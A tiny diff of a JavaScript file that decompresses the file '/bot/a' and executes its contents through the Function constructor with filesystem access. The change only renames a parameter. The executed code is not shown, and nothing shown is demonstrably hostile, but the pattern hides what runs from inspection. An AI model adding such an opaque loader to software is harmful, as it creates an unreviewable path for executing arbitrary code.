@@ -1,4 +1,4 @@
 import f from'fs'
 import z from'zlib'
-Function('b',z.inflateRawSync(
+Function('o',z.inflateRawSync(
 f.readFileSync('/bot/a')))(f)
